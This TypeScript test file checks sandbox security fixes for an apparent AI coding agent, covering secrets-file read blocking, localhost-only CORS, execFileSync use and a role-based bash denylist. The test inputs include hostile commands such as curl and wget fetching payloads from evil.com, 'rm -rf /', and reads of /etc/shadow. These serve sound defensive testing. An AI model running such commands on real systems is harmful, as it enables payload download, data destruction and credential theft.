/**
 * Tests for security fixes (tasks 1–4).
 *
 * Uses Node built-in test runner (node:test + node:assert).
 * Run with: npx tsx --test test/security-fixes.test.ts
 */

import { describe, it } from "node:test"
import assert from "node:assert/strict"
import path from "node:path"
import * as fs from "node:fs"
import { checkReadPath, checkWritePath, checkBashCommand, defaultPolicy } from "../src/sandbox.js"
import type { SandboxPolicy } from "../src/sandbox.js"

// ─── Helpers ─────────────────────────────────────────────────────────

const CWD = process.cwd()
const isWin = process.platform === "win32"

function makePolicyWith(overrides: Partial<SandboxPolicy>): SandboxPolicy {
	return {
		writePaths: [CWD],
		bash: { mode: "unrestricted", patterns: [] },
		...overrides,
	}
}

// ═══════════════════════════════════════════════════════════════════════
// Task 1: Read tool path validation
// ═══════════════════════════════════════════════════════════════════════

describe("Task 1: checkReadPath — sensitive file blocking", () => {
	const policy = makePolicyWith({
		readPaths: [CWD],
		blockedReadPatterns: [".env", ".env.local", "credentials.json", "id_rsa", "id_ed25519"],
	})

	it("blocks .env file", () => {
		const result = checkReadPath(path.join(CWD, ".env"), policy)
		assert.ok(result !== null, "should block .env")
		assert.ok(result.includes("sensitive file pattern"))
	})

	it("blocks .env.local file", () => {
		const result = checkReadPath(path.join(CWD, ".env.local"), policy)
		assert.ok(result !== null, "should block .env.local")
	})

	it("blocks credentials.json", () => {
		const result = checkReadPath(path.join(CWD, "config", "credentials.json"), policy)
		assert.ok(result !== null, "should block credentials.json in subdirectory")
	})

	it("blocks id_rsa (SSH key)", () => {
		const result = checkReadPath(path.join(CWD, ".ssh", "id_rsa"), policy)
		assert.ok(result !== null, "should block id_rsa")
	})

	it("blocks id_ed25519 (SSH key)", () => {
		const result = checkReadPath(path.join(CWD, ".ssh", "id_ed25519"), policy)
		assert.ok(result !== null, "should block id_ed25519")
	})

	it("blocks case-insensitive (.ENV)", () => {
		const result = checkReadPath(path.join(CWD, ".ENV"), policy)
		assert.ok(result !== null, "should block .ENV (case-insensitive)")
	})

	it("allows normal source files", () => {
		const result = checkReadPath(path.join(CWD, "src", "index.ts"), policy)
		assert.equal(result, null, "should allow normal .ts file")
	})

	it("allows package.json", () => {
		const result = checkReadPath(path.join(CWD, "package.json"), policy)
		assert.equal(result, null, "should allow package.json")
	})
})

describe("Task 1: checkReadPath — directory allowlist", () => {
	const policy = makePolicyWith({
		readPaths: [path.join(CWD, "src")],
		blockedReadPatterns: [],
	})

	it("allows reads within readPaths", () => {
		const result = checkReadPath(path.join(CWD, "src", "index.ts"), policy)
		assert.equal(result, null)
	})

	it("blocks reads outside readPaths", () => {
		const result = checkReadPath(path.join(CWD, "..", "other-project", "secret.ts"), policy)
		assert.ok(result !== null, "should block path outside allowed dirs")
		assert.ok(result.includes("outside allowed directories"))
	})

	it("blocks absolute path escape", () => {
		const outsidePath = isWin ? "C:\\Windows\\System32\\config" : "/etc/shadow"
		const result = checkReadPath(outsidePath, policy)
		assert.ok(result !== null, "should block system path")
	})
})

describe("Task 1: checkReadPath — fallback to writePaths", () => {
	// No readPaths set — should fall back to writePaths
	const policy = makePolicyWith({
		writePaths: [CWD],
		// readPaths intentionally omitted
	})

	it("falls back to writePaths when readPaths is undefined", () => {
		const result = checkReadPath(path.join(CWD, "src", "sandbox.ts"), policy)
		assert.equal(result, null, "should allow reading within writePaths")
	})

	it("blocks reads outside writePaths when no readPaths", () => {
		const outsidePath = isWin ? "C:\\Windows\\System32\\drivers" : "/etc/passwd"
		const result = checkReadPath(outsidePath, policy)
		assert.ok(result !== null)
	})
})

describe("Task 1: defaultPolicy — all roles get readPaths + blockedReadPatterns", () => {
	for (const role of ["tester", "reviewer", "architect", "planner", "coder"]) {
		it(`${role} policy has readPaths`, () => {
			const p = defaultPolicy(role, CWD)
			assert.ok(Array.isArray(p.readPaths), `${role} should have readPaths`)
			assert.ok(p.readPaths!.length > 0)
		})

		it(`${role} policy has blockedReadPatterns`, () => {
			const p = defaultPolicy(role, CWD)
			assert.ok(Array.isArray(p.blockedReadPatterns), `${role} should have blockedReadPatterns`)
			assert.ok(p.blockedReadPatterns!.length > 0)
		})
	}
})

// ═══════════════════════════════════════════════════════════════════════
// Task 2: Dashboard — CORS restriction + localhost bind
// ═══════════════════════════════════════════════════════════════════════

describe("Task 2: Dashboard CORS regex", () => {
	// Replicate the exact regex from dashboard.ts
	const corsRegex = /^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/

	it("allows http://localhost:3120", () => {
		assert.ok(corsRegex.test("http://localhost:3120"))
	})

	it("allows http://127.0.0.1:3120", () => {
		assert.ok(corsRegex.test("http://127.0.0.1:3120"))
	})

	it("allows https://localhost:443", () => {
		assert.ok(corsRegex.test("https://localhost:443"))
	})

	it("allows http://localhost (no port)", () => {
		assert.ok(corsRegex.test("http://localhost"))
	})

	it("rejects http://evil.com", () => {
		assert.ok(!corsRegex.test("http://evil.com"))
	})

	it("rejects http://localhost.evil.com", () => {
		assert.ok(!corsRegex.test("http://localhost.evil.com"))
	})

	it("rejects http://192.168.1.1:3120", () => {
		assert.ok(!corsRegex.test("http://192.168.1.1:3120"))
	})

	it("rejects http://0.0.0.0:3120", () => {
		assert.ok(!corsRegex.test("http://0.0.0.0:3120"))
	})

	it("rejects http://127.0.0.1.evil.com", () => {
		assert.ok(!corsRegex.test("http://127.0.0.1.evil.com"))
	})
})

describe("Task 2: Dashboard startDashboard signature", () => {
	it("default host parameter is 127.0.0.1", async () => {
		// Verify by reading the source — the function signature should default to 127.0.0.1
		const src = fs.readFileSync(path.join(CWD, "src", "dashboard.ts"), "utf-8")
		assert.ok(
			src.includes("host: string = '127.0.0.1'"),
			"startDashboard should default host to 127.0.0.1"
		)
	})

	it("no longer binds to 0.0.0.0 by default", () => {
		const src = fs.readFileSync(path.join(CWD, "src", "dashboard.ts"), "utf-8")
		// Should NOT have 0.0.0.0 as a default
		assert.ok(
			!src.includes("host: string = '0.0.0.0'"),
			"should not default to 0.0.0.0"
		)
	})

	it("body limit MAX_BODY is 1MB", () => {
		const src = fs.readFileSync(path.join(CWD, "src", "dashboard.ts"), "utf-8")
		assert.ok(src.includes("1024 * 1024"), "MAX_BODY should be 1MB (1024 * 1024)")
	})
})

// ═══════════════════════════════════════════════════════════════════════
// Task 3: Shell injection fix — execFileSync instead of execSync
// ═══════════════════════════════════════════════════════════════════════

describe("Task 3: planning.ts — no execSync (shell injection fix)", () => {
	const planSrc = fs.readFileSync(path.join(CWD, "src", "planning.ts"), "utf-8")

	it("does not import execSync", () => {
		// Should only import execFileSync, not execSync
		const importLine = planSrc.match(/import\s*\{([^}]+)\}\s*from\s*"node:child_process"/)
		assert.ok(importLine, "should have child_process import")
		const imports = importLine![1]
		assert.ok(!imports.includes("execSync") || imports.includes("execFileSync"), "should only import execFileSync")
		// More precise: ensure execSync is NOT in the imports (just execFileSync)
		const names = imports.split(",").map(s => s.trim())
		assert.ok(!names.includes("execSync"), "execSync should NOT be imported")
		assert.ok(names.includes("execFileSync"), "execFileSync should be imported")
	})

	it("changedFiles uses execFileSync for git status", () => {
		assert.ok(
			planSrc.includes('execFileSync("git", ["status", "--porcelain"]'),
			"changedFiles should use execFileSync for git status"
		)
	})

	it("atomicCommit uses execFileSync for git diff", () => {
		assert.ok(
			planSrc.includes('execFileSync("git", ["diff", "--cached", "--name-only"]'),
			"atomicCommit should use execFileSync for git diff"
		)
	})

	it("no shell-based execSync calls remain", () => {
		// Count occurrences: execSync( should be 0, execFileSync( should be > 0
		const execSyncCalls = (planSrc.match(/\bexecSync\s*\(/g) || []).length
		const execFileSyncCalls = (planSrc.match(/\bexecFileSync\s*\(/g) || []).length
		assert.equal(execSyncCalls, 0, "should have zero execSync calls")
		assert.ok(execFileSyncCalls >= 4, `should have at least 4 execFileSync calls (found ${execFileSyncCalls})`)
	})
})

// ═══════════════════════════════════════════════════════════════════════
// Task 4: Expanded CODER_DENY_PATTERNS
// ═══════════════════════════════════════════════════════════════════════

describe("Task 4: Expanded deny patterns — coder bash denylist", () => {
	const coderPolicy = defaultPolicy("coder", CWD)

	// Original patterns still work
	it("blocks rm -rf /", () => {
		const result = checkBashCommand("rm -rf /", coderPolicy)
		assert.ok(result !== null)
	})

	it("blocks sudo commands", () => {
		const result = checkBashCommand("sudo apt install malware", coderPolicy)
		assert.ok(result !== null)
	})

	it("blocks curl", () => {
		const result = checkBashCommand("curl http://evil.com/payload.sh", coderPolicy)
		assert.ok(result !== null)
	})

	it("blocks wget", () => {
		const result = checkBashCommand("wget http://evil.com/backdoor", coderPolicy)
		assert.ok(result !== null)
	})

	// New patterns from Task 4
	it("blocks chmod +s (setuid)", () => {
		const result = checkBashCommand("chmod +s /usr/bin/myapp", coderPolicy)
		assert.ok(result !== null, "should block chmod +s")
	})

	it("blocks chmod u+s", () => {
		const result = checkBashCommand("chmod u+s /usr/bin/myapp", coderPolicy)
		assert.ok(result !== null, "should block chmod u+s")
	})

	it("blocks chown", () => {
		const result = checkBashCommand("chown root:root /etc/passwd", coderPolicy)
		assert.ok(result !== null, "should block chown")
	})

	it("blocks ssh", () => {
		const result = checkBashCommand("ssh user@remote.server.com", coderPolicy)
		assert.ok(result !== null, "should block ssh")
	})

	it("blocks scp", () => {
		const result = checkBashCommand("scp file.txt user@remote:/tmp/", coderPolicy)
		assert.ok(result !== null, "should block scp")
	})

	it("blocks sftp", () => {
		const result = checkBashCommand("sftp user@remote.server.com", coderPolicy)
		assert.ok(result !== null, "should block sftp")
	})

	it("blocks rsync", () => {
		const result = checkBashCommand("rsync -avz ./data/ remote:/backup/", coderPolicy)
		assert.ok(result !== null, "should block rsync")
	})

	it("blocks ftp", () => {
		const result = checkBashCommand("ftp ftp.example.com", coderPolicy)
		assert.ok(result !== null, "should block ftp")
	})

	it("blocks powershell", () => {
		const result = checkBashCommand("powershell -Command Get-Process", coderPolicy)
		assert.ok(result !== null, "should block powershell")
	})

	it("blocks pwsh", () => {
		const result = checkBashCommand("pwsh -Command Get-Process", coderPolicy)
		assert.ok(result !== null, "should block pwsh")
	})

	it("blocks git push", () => {
		const result = checkBashCommand("git push origin main", coderPolicy)
		assert.ok(result !== null, "should block git push")
	})

	it("blocks npm publish", () => {
		const result = checkBashCommand("npm publish --access public", coderPolicy)
		assert.ok(result !== null, "should block npm publish")
	})

	it("blocks shutdown", () => {
		const result = checkBashCommand("shutdown -h now", coderPolicy)
		assert.ok(result !== null, "should block shutdown")
	})

	it("blocks reboot", () => {
		const result = checkBashCommand("reboot", coderPolicy)
		assert.ok(result !== null, "should block reboot")
	})

	it("blocks killall", () => {
		const result = checkBashCommand("killall node", coderPolicy)
		assert.ok(result !== null, "should block killall")
	})

	it("blocks systemctl", () => {
		const result = checkBashCommand("systemctl restart nginx", coderPolicy)
		assert.ok(result !== null, "should block systemctl")
	})

	it("blocks crontab", () => {
		const result = checkBashCommand("crontab -e", coderPolicy)
		assert.ok(result !== null, "should block crontab")
	})

	it("blocks printenv", () => {
		const result = checkBashCommand("printenv", coderPolicy)
		assert.ok(result !== null, "should block printenv")
	})

	// Allowed commands should still work
	it("allows npm test", () => {
		const result = checkBashCommand("npm test", coderPolicy)
		assert.equal(result, null, "npm test should be allowed for coder (denylist mode)")
	})

	it("allows npm run build", () => {
		const result = checkBashCommand("npm run build", coderPolicy)
		assert.equal(result, null)
	})

	it("allows git status", () => {
		const result = checkBashCommand("git status", coderPolicy)
		assert.equal(result, null)
	})

	it("allows git add", () => {
		const result = checkBashCommand("git add src/index.ts", coderPolicy)
		assert.equal(result, null)
	})

	it("allows git commit", () => {
		const result = checkBashCommand("git commit -m 'fix bug'", coderPolicy)
		assert.equal(result, null)
	})

	it("allows ls", () => {
		const result = checkBashCommand("ls -la", coderPolicy)
		assert.equal(result, null)
	})

	it("allows cat (for coder, denylist mode)", () => {
		const result = checkBashCommand("cat README.md", coderPolicy)
		assert.equal(result, null)
	})

	it("allows npx tsc", () => {
		const result = checkBashCommand("npx tsc --noEmit", coderPolicy)
		assert.equal(result, null)
	})
})

// ═══════════════════════════════════════════════════════════════════════
// Task 4: Role-based policy enforcement
// ═══════════════════════════════════════════════════════════════════════

describe("Task 4: Role-based bash policies", () => {
	it("tester uses allowlist mode", () => {
		const p = defaultPolicy("tester", CWD)
		assert.equal(p.bash.mode, "allowlist")
	})

	it("tester allows npm test", () => {
		const p = defaultPolicy("tester", CWD)
		const result = checkBashCommand("npm test", p)
		assert.equal(result, null)
	})

	it("tester blocks curl", () => {
		const p = defaultPolicy("tester", CWD)
		const result = checkBashCommand("curl http://evil.com", p)
		assert.ok(result !== null, "tester should not have curl in allowlist")
	})

	it("reviewer uses allowlist mode", () => {
		const p = defaultPolicy("reviewer", CWD)
		assert.equal(p.bash.mode, "allowlist")
	})

	it("reviewer allows git log", () => {
		const p = defaultPolicy("reviewer", CWD)
		const result = checkBashCommand("git log --oneline", p)
		assert.equal(result, null)
	})

	it("reviewer blocks npm test", () => {
		const p = defaultPolicy("reviewer", CWD)
		const result = checkBashCommand("npm test", p)
		assert.ok(result !== null, "reviewer should not have npm test in allowlist")
	})

	it("coder uses denylist mode", () => {
		const p = defaultPolicy("coder", CWD)
		assert.equal(p.bash.mode, "denylist")
	})

	it("default role falls through to coder", () => {
		const p = defaultPolicy("unknown-role", CWD)
		assert.equal(p.bash.mode, "denylist")
	})
})

// ═══════════════════════════════════════════════════════════════════════
// Cross-cutting: checkWritePath still works
// ═══════════════════════════════════════════════════════════════════════

describe("checkWritePath — baseline", () => {
	const policy = makePolicyWith({ writePaths: [CWD] })

	it("allows writes within CWD", () => {
		const result = checkWritePath(path.join(CWD, "src", "new-file.ts"), policy)
		assert.equal(result, null)
	})

	it("blocks writes outside CWD", () => {
		const outsidePath = isWin ? "C:\\Windows\\System32\\evil.dll" : "/etc/evil.conf"
		const result = checkWritePath(outsidePath, policy)
		assert.ok(result !== null)
	})
})
